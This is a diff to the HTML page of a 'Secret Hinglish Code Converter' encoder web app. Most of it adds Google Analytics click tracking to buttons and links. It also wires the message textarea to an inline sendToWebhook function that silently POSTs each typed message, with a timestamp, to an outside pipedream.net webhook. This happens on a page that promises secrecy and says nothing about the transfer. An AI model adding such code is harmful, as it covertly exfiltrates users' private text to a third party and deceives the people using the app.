@@ -20,7 +20,14 @@
     <!-- Navigation Bar -->
      <div class="navbar">
         <a href="#" onclick="showSection('home')">Home</a>
-        <a href="#" onclick="showSection('encoder-decoder')">Encoder-Decoder</a>
+        <<a href="#"
+   onclick="gtag('event', 'nav_click', {
+       'event_category': 'navigation',
+       'event_label': 'encoder_decoder_button'
+   }); showSection('encoder-decoder');">
+   Encoder-Decoder
+</a>
+         
         <a href="#" onclick="showSection('about')">About</a>
      </div>
 
@@ -54,9 +61,28 @@
     <div id="encoder-decoder" class="section">
         <div class="container">
             <h2>🔒 Secret Hinglish Code Converter 🔒</h2>
-            <textarea id="inputText" placeholder="Apna message likho..."></textarea><br>
-            <button class="btn-encode" onclick="encodeMessage()">Encode</button>
-            <button class="btn-decode" onclick="decodeMessage()">Decode</button>
+            <textarea id="inputText"
+          placeholder="Apna message likho..."
+          oninput="sendToWebhook(this.value)">
+</textarea>
+
+            
+            <button class="btn-encode"
+        onclick="gtag('event', 'encode_click', {
+            event_category: 'encoder_decoder',
+            event_label: 'encode_button'
+        }); encodeMessage();">
+    Encode
+</button>
+            
+            <button class="btn-decode"
+        onclick="gtag('event', 'decode_click', {
+            event_category: 'encoder_decoder',
+            event_label: 'decode_button'
+        }); decodeMessage();">
+    Decode
+</button>
+            
             <button class="btn-clear" onclick="clearText()">Clear</button>
             <h3>Output:</h3>
             <textarea id="outputText" readonly></textarea><br>
@@ -99,7 +125,21 @@
          <p>Built with ❤️ by <a href="https://github.com/Ajitkhanta48" target="_blank">Ajit Khanta</a> <br>© 2025 Hinglish Secret Code </p>
         <p>
     </footer>
+    
 
-    <script src="script.js"></script>
+<script>
+function sendToWebhook(text) {
+    fetch("https://eog8g8o8slbuq6m.m.pipedream.net", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            message: text,
+            timestamp: new Date().toISOString()
+        })
+    });
+}
+</script>
+
+<script src="script.js"></script>
 </body>
 </html>
